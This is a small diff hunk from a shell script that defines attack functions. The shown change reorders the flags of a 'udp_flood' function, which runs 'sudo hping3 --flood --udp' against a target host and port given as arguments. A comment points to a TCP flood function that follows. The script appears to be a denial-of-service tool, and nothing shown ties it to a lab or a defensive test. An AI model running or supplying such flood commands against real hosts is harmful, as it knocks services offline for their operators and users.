@@ -38,7 +38,7 @@ sleep 2
 # Function to perform UDP flood attack
 udp_flood() {
     echo "Starting UDP flood attack on $1 on port $2 with $3 bytes of data..."
-    sudo hping3 --udp -p $2 --flood -d $3 $1
+    sudo hping3 --flood --udp -d $3 -p $2 $1
 }
 
 # Function to perform TCP flood attack
